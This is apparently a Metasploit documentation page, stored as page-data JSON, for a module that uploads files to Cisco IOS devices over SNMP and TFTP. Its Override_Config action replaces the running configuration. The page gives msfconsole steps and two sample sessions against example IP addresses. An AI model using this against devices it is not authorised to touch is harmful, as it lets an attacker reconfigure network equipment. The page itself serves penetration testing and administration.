{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/scanner/snmp/cisco_upload_file","result":{"data":{"moduleMetadataJson":{"id":"519b0749-6cc0-523d-a31a-c31c290b0719","name":"Cisco IOS SNMP File Upload (TFTP)","fullname":"auxiliary/scanner/snmp/cisco_upload_file","description":"This module will copy file to a Cisco IOS device using SNMP and TFTP.\n        The action Override_Config will override the running config of the Cisco device.\n        A read-write SNMP community is required. The SNMP community scanner module can\n        assist in identifying a read-write community. The target must\n        be able to connect back to the Metasploit system and the use of\n        NAT will cause the TFTP transfer to fail.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/scanner/snmp/cisco_upload_file","documentationSlug":"/modules/documentation/auxiliary/scanner/snmp/cisco_upload_file","referencesSlug":"/modules/references/auxiliary/scanner/snmp/cisco_upload_file"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  Cisco IOS devices can be configured to retrieve, via tftp,  a file via SNMP.\nThis is a well <a href=\"https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/15217-copy-configs-snmp.html#copying_startup\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">documented</a>\nfeature of IOS and many other networking devices, and is part of an administrator functionality.\nThis functionality can also be used to change their running configuration. This is documented <a href=\"https://www.ciscozine.com/send-cisco-commands-via-snmp/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">here</a>.\nA read-write community string is required, as well as a tftp server (metasploit includes one).\nThe default functionality of the module will upload the file and it will be saved to <code class=\"language-text\">flash:</code>.\nThe <code class=\"language-text\">Override_Config</code> action will override the running configuration of the device and the file will not be saved.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>Upload_File (Default Action)</p>\n<ol>\n<li>Enable SNMP with a read/write community string on IOS: <code class=\"language-text\">snmp-server community private rw</code></li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use auxiliary/scanner/snmp/cisco_upload_file</code></li>\n<li>Do: <code class=\"language-text\">set COMMUNITY [read-write snmp]</code></li>\n<li>Do: <code class=\"language-text\">set lhost [your IP address]</code></li>\n<li>Do: <code class=\"language-text\">set rhosts [ip]</code></li>\n<li>Do: <code class=\"language-text\">set source [file]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<p>Override_Config</p>\n<ol>\n<li>Enable SNMP with a read/write community string on IOS: <code class=\"language-text\">snmp-server community private rw</code></li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use auxiliary/scanner/snmp/cisco_upload_file</code></li>\n<li>Do: <code class=\"language-text\">set COMMUNITY [read-write snmp]</code></li>\n<li>Do: <code class=\"language-text\">set lhost [your IP address]</code></li>\n<li>Do: <code class=\"language-text\">set rhosts [ip]</code></li>\n<li>Do: <code class=\"language-text\">set source [file]</code></li>\n<li>Do: <code class=\"language-text\">set action [Override_Config]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You can <strong>Verify</strong> that the running config has been overridden by using the <strong>auxiliary/scanner/snmp/cisco<em>config</em>tftp</strong> module to download the current running config from the device.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>COMMUNITY</strong></p>\n<p>  The SNMP community string to use which must be read-write.  Default is <code class=\"language-text\">public</code>.</p>\n<p>  <strong>SOURCE</strong></p>\n<p>  The location of the source file to be uploaded to the Cisco device.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"cisco-uc520-8u-4fxo-k9-running-ios-124\" style=\"position:relative;\"><a href=\"#cisco-uc520-8u-4fxo-k9-running-ios-124\" aria-label=\"cisco uc520 8u 4fxo k9 running ios 124 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cisco UC520-8U-4FXO-K9 running IOS 12.4</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; setg rhosts 2.2.2.2\nrhosts =&gt; 2.2.2.2\nmsf5 &gt; use auxiliary/scanner/snmp/cisco_upload_file\nmsf5 auxiliary(scanner/snmp/cisco_upload_file) &gt; set source /tmp/backup_config2\nsource =&gt; /tmp/backup_config2\nmsf5 auxiliary(scanner/snmp/cisco_upload_file) &gt; set community private\ncommunity =&gt; private\nmsf5 auxiliary(scanner/snmp/cisco_upload_file) &gt; run\n\n[*] Starting TFTP server...\n[*] Copying file backup_config2 to 2.2.2.2...\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Providing some time for transfers to complete...\n[*] Shutting down the TFTP service...\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"cisco-3560g-switch-running-ios-122\" style=\"position:relative;\"><a href=\"#cisco-3560g-switch-running-ios-122\" aria-label=\"cisco 3560g switch running ios 122 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cisco 3560G switch running IOS 12.2</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">`msf5 auxiliary(scanner/snmp/cisco_upload_file) &gt; set COMMUNITY private`\n`COMMUNITY =&gt; private`\n`msf5 auxiliary(scanner/snmp/cisco_upload_file) &gt; set LHOST 10.20.164.164`\n`LHOST =&gt; 10.20.164.164`\n`msf5 auxiliary(scanner/snmp/cisco_upload_file) &gt; set action Override_Config`\n`action =&gt; Override_Config`\n`msf5 auxiliary(scanner/snmp/cisco_upload_file) &gt; set rhosts 10.20.205.5`\n`rhosts =&gt; 10.20.205.5`\n`msf5 auxiliary(scanner/snmp/cisco_upload_file) &gt; set source /root/Desktop/newconfig`\n`source =&gt; /root/Desktop/newconfig`\n`msf5 auxiliary(scanner/snmp/cisco_upload_file) &gt; run`\n\n`[*] Starting TFTP server...`\n`[*] Copying file newconfig to 10.20.205.5...`\n`[*] Scanned 1 of 1 hosts (100% complete)`\n`[*] Providing some time for transfers to complete...`\n`[*] Shutting down the TFTP service...`\n`[*] Auxiliary module execution completed`</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"519b0749-6cc0-523d-a31a-c31c290b0719"}}}